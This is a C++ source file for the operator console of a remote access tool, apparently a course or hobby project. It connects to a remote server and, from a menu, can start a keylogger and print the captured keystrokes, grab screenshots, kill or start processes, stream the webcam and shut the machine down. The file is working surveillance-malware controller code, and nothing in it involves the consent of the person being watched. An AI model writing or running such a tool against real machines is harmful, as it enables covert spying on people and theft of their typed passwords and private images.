#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <iomanip>
#include <thread>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

// Global Socket
SOCKET clientSocket;

// Network Helper Functions
void sendLine(const string& s) {
    string msg = s + "\n";
    send(clientSocket, msg.c_str(), msg.length(), 0);
}

string receiveLine() {
    string result;
    char c;
    while (recv(clientSocket, &c, 1, 0) > 0) {
        if (c == '\n') break;
        if (c != '\r') result += c;
    }
    return result;
}

// Menu Functions
void displayMainMenu() {
    cout << "\n========== REMOTE ACCESS TOOL ==========\n";
    cout << "1. Keylogger\n";
    cout << "2. Screenshot\n";
    cout << "3. Process Management\n";
    cout << "4. Application Management\n";
    cout << "5. Webcam Streaming\n";
    cout << "6. Shutdown Server\n";
    cout << "0. Exit\n";
    cout << "========================================\n";
    cout << "Choose option: ";
}

// Keylogger Functions
void keyloggerMenu() {
    string choice;
    bool running = true;
    
    sendLine("KEYLOG");
    
    while (running) {
        cout << "\n----- KEYLOGGER -----\n";
        cout << "1. Start Keylogger\n";
        cout << "2. Stop Keylogger\n";
        cout << "3. Print Keys\n";
        cout << "0. Back to Main Menu\n";
        cout << "Choose: ";
        cin >> choice;
        cin.ignore();
        
        if (choice == "1") {
            sendLine("HOOK");
            cout << "Keylogger started on server.\n";
        } else if (choice == "2") {
            sendLine("UNHOOK");
            cout << "Keylogger stopped on server.\n";
        } else if (choice == "3") {
            sendLine("PRINT");
            char buffer[4096];
            int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0';
                cout << "\n----- CAPTURED KEYS -----\n";
                cout << buffer << endl;
                cout << "-------------------------\n";
            }
        } else if (choice == "0") {
            sendLine("QUIT");
            running = false;
        }
    }
}

// Screenshot Function
void screenshotMenu() {
    string choice;
    bool running = true;
    
    sendLine("TAKEPIC");
    
    while (running) {
        cout << "\n----- SCREENSHOT -----\n";
        cout << "1. Take Screenshot\n";
        cout << "0. Back to Main Menu\n";
        cout << "Choose: ";
        cin >> choice;
        cin.ignore();
        
        if (choice == "1") {
            sendLine("TAKE");
            
            string sizeStr = receiveLine();
            unsigned long size = stoul(sizeStr);
            
            cout << "Receiving screenshot (" << size << " bytes)...\n";
            
            char* buffer = new char[size];
            unsigned long totalReceived = 0;
            
            while (totalReceived < size) {
                int bytesReceived = recv(clientSocket, buffer + totalReceived, size - totalReceived, 0);
                if (bytesReceived > 0) {
                    totalReceived += bytesReceived;
                }
            }
            
            string filename = "screenshot.png";
            ofstream file(filename, ios::binary);
            file.write(buffer, size);
            file.close();
            
            delete[] buffer;
            
            cout << "Screenshot saved as: " << filename << endl;
        } else if (choice == "0") {
            sendLine("QUIT");
            running = false;
        }
    }
}

// Process Management
void processMenu() {
    string choice;
    bool running = true;
    
    sendLine("PROCESS");
    
    while (running) {
        cout << "\n----- PROCESS MANAGEMENT -----\n";
        cout << "1. View Processes\n";
        cout << "2. Kill Process\n";
        cout << "3. Start Process\n";
        cout << "0. Back to Main Menu\n";
        cout << "Choose: ";
        cin >> choice;
        cin.ignore();
        
        if (choice == "1") {
            sendLine("XEM");
            
            string countStr = receiveLine();
            int count = stoi(countStr);
            
            cout << "\n----- PROCESS LIST -----\n";
            cout << left << setw(40) << "Name" << setw(10) << "PID" << setw(10) << "Threads" << endl;
            cout << string(60, '-') << endl;
            
            for (int i = 0; i < count; i++) {
                string name = receiveLine();
                string pid = receiveLine();
                string threads = receiveLine();
                
                cout << left << setw(40) << name << setw(10) << pid << setw(10) << threads << endl;
            }
            cout << "------------------------\n";
            
        } else if (choice == "2") {
            sendLine("KILL");
            cout << "Enter Process ID to kill: ";
            string pid;
            getline(cin, pid);
            
            sendLine("KILLID");
            sendLine(pid);
            
            string response = receiveLine();
            cout << response << endl;
            
            sendLine("QUIT");
            
        } else if (choice == "3") {
            sendLine("START");
            cout << "Enter process name (without .exe): ";
            string name;
            getline(cin, name);
            
            sendLine("STARTID");
            sendLine(name);
            
            string response = receiveLine();
            cout << response << endl;
            
            sendLine("QUIT");
            
        } else if (choice == "0") {
            sendLine("QUIT");
            running = false;
        }
    }
}

// Application Management
void applicationMenu() {
    string choice;
    bool running = true;
    
    sendLine("APPLICATION");
    
    while (running) {
        cout << "\n----- APPLICATION MANAGEMENT -----\n";
        cout << "1. View Applications\n";
        cout << "2. Kill Application\n";
        cout << "3. Start Application\n";
        cout << "0. Back to Main Menu\n";
        cout << "Choose: ";
        cin >> choice;
        cin.ignore();
        
        if (choice == "1") {
            sendLine("XEM");
            
            string countStr = receiveLine();
            int count = stoi(countStr);
            
            cout << "\n----- APPLICATION LIST -----\n";
            cout << left << setw(40) << "Name" << setw(10) << "PID" << setw(10) << "Threads" << endl;
            cout << string(60, '-') << endl;
            
            for (int i = 0; i < count; i++) {
                string status = receiveLine();
                string name = receiveLine();
                string pid = receiveLine();
                string threads = receiveLine();
                
                cout << left << setw(40) << name << setw(10) << pid << setw(10) << threads << endl;
            }
            cout << "----------------------------\n";
            
        } else if (choice == "2") {
            sendLine("KILL");
            cout << "Enter Application PID to kill: ";
            string pid;
            getline(cin, pid);
            
            sendLine("KILLID");
            sendLine(pid);
            
            string response = receiveLine();
            cout << response << endl;
            
            sendLine("QUIT");
            
        } else if (choice == "3") {
            sendLine("START");
            cout << "Enter application name (without .exe): ";
            string name;
            getline(cin, name);
            
            sendLine("STARTID");
            sendLine(name);
            
            string response = receiveLine();
            cout << response << endl;
            
            sendLine("QUIT");
            
        } else if (choice == "0") {
            sendLine("QUIT");
            running = false;
        }
    }
}

// Webcam Streaming
void webcamMenu() {
    string choice;
    bool running = true;
    
    sendLine("WEBCAM");
    
    while (running) {
        cout << "\n----- WEBCAM STREAMING -----\n";
        cout << "1. Start Streaming\n";
        cout << "2. Stop Streaming\n";
        cout << "0. Back to Main Menu\n";
        cout << "Choose: ";
        cin >> choice;
        cin.ignore();
        
        if (choice == "1") {
            sendLine("START");
            string response = receiveLine();
            
            if (response == "OK") {
                cout << "Streaming started! Receiving frames...\n";
                cout << "Press Ctrl+C or use option 2 to stop.\n";
                
                // Create frames directory
                system("if not exist frames mkdir frames");
                
                int frameCount = 0;
                auto startTime = chrono::high_resolution_clock::now();
                
                // Receive frames in a thread
                thread receiveThread([&]() {
                    while (choice == "1") {
                        try {
                            // Receive frame size
                            string sizeStr = receiveLine();
                            if (sizeStr.empty() || sizeStr == "STOPPED") break;
                            
                            unsigned long frameSize = stoul(sizeStr);
                            if (frameSize == 0 || frameSize > 500000) continue;
                            
                            // Receive frame data
                            vector<char> frameBuffer(frameSize);
                            unsigned long totalReceived = 0;
                            
                            while (totalReceived < frameSize) {
                                int bytesReceived = recv(clientSocket, frameBuffer.data() + totalReceived, 
                                                        frameSize - totalReceived, 0);
                                if (bytesReceived <= 0) break;
                                totalReceived += bytesReceived;
                            }
                            
                            if (totalReceived == frameSize) {
                                // Save frame as JPEG
                                string filename = "frames/frame_" + to_string(frameCount) + ".jpg";
                                ofstream file(filename, ios::binary);
                                file.write(frameBuffer.data(), frameSize);
                                file.close();
                                
                                frameCount++;
                                
                                // Calculate and display FPS every 30 frames
                                if (frameCount % 30 == 0) {
                                    auto currentTime = chrono::high_resolution_clock::now();
                                    auto duration = chrono::duration_cast<chrono::milliseconds>(currentTime - startTime);
                                    double fps = (frameCount * 1000.0) / duration.count();
                                    cout << "Frames: " << frameCount << " | FPS: " << fixed << setprecision(1) << fps << "\r";
                                    cout.flush();
                                }
                            }
                        } catch (...) {
                            break;
                        }
                    }
                    cout << "\nTotal frames received: " << frameCount << endl;
                });
                
                receiveThread.detach();
                
                cout << "Streaming in progress. Select option 2 to stop.\n";
                
            } else {
                cout << response << endl;
            }
            
        } else if (choice == "2") {
            sendLine("STOP");
            string response = receiveLine();
            cout << response << endl;
            
        } else if (choice == "0") {
            sendLine("QUIT");
            running = false;
        }
    }
}

// Main Function
int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed" << endl;
        return 1;
    }
    
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed" << endl;
        WSACleanup();
        return 1;
    }
    
    string serverIP;
    cout << "Enter server IP address (or 127.0.0.1 for localhost): ";
    getline(cin, serverIP);
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr);
    serverAddr.sin_port = htons(5656);
    
    cout << "Connecting to server...\n";
    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "Connection failed. Is the server running?\n";
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }
    
    cout << "Connected to server successfully!\n";
    
    string choice;
    bool running = true;
    
    while (running) {
        displayMainMenu();
        cin >> choice;
        cin.ignore();
        
        if (choice == "1") {
            keyloggerMenu();
        } else if (choice == "2") {
            screenshotMenu();
        } else if (choice == "3") {
            processMenu();
        } else if (choice == "4") {
            applicationMenu();
        } else if (choice == "5") {
            webcamMenu();
        } else if (choice == "6") {
            sendLine("SHUTDOWN");
            cout << "Shutdown command sent to server.\n";
            running = false;
        } else if (choice == "0") {
            sendLine("QUIT");
            running = false;
        }
    }
    
    closesocket(clientSocket);
    WSACleanup();
    
    cout << "Disconnected from server.\n";
    return 0;
}
